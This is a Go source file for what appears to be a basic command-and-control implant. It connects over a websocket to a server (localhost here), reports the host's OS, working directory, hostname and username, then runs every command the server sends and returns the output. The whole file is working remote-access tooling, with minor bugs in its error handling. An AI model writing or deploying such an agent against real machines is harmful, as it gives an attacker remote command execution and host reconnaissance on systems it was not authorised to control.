package main

import (
	"encoding/json"
	"github.com/gorilla/websocket"
	"log"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

type CommandResult struct {
	HostInfo map[string]string
	Command string
	Result  string
	Err     string
}

func send(c *websocket.Conn, msg []byte) {
	err := c.WriteMessage(1, msg)
	if err != nil {
		log.Println("send error: ", err)
	}
}

func recieve(c *websocket.Conn) (string, error) {
	_, payload, err := c.ReadMessage()
	return string(payload), err
}

// this function needs to create a CommandResult struct and return it
func commandHandler(c *websocket.Conn, cmd string) {
	log.Println("recieved command:", cmd)
	command := strings.Split(cmd, " ")
	out, err := exec.Command(command[0], command[1:]...).Output()
	retError := ""
	if err != nil {
		log.Println(err)
		retError = err.Error()
	}
	cr := &CommandResult{
		HostInfo: hostInfo,
		Command: cmd,
		Result:  string(out),
		Err:    retError, 
	}
	msg, _ := json.Marshal(cr)
	send(c, msg)
}

func getHostInfo() map[string]string {
	pwd, err := os.Getwd()
	if err != nil {
		pwd = ""
	}
	hostname, err := os.Hostname()
	if err != nil {
		pwd = ""
	}
	user, err := user.Current()
	
	info := make(map[string]string)
	info["os"] = runtime.GOOS
	info["working_dir"] = pwd
	info["hostname"] = hostname
	info["username"] = user.Username
	return info
}

var hostInfo = getHostInfo()

func main() {
	host := "ws://localhost:8000"
	log.Println("Connecting to host: ", host)

	conn, _, err := websocket.DefaultDialer.Dial(host, nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer conn.Close()

	// get the initial host info and send it as the first message
	cr := &CommandResult{
		HostInfo: hostInfo,
		Command: "connect",
		Result:  "hello",
		Err:     "",
	}
	msg,_ := json.Marshal(cr)
	send(conn, msg)
	// after that, wait for commands and respond to them
	for {
		msg, err := recieve(conn)
		if err != nil {
			log.Println("recieve error: ", err)
			break
		}
		commandHandler(conn, msg)
	}

	// send the proper disconnect signal to the other end
	conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
	time.Sleep(100)
}
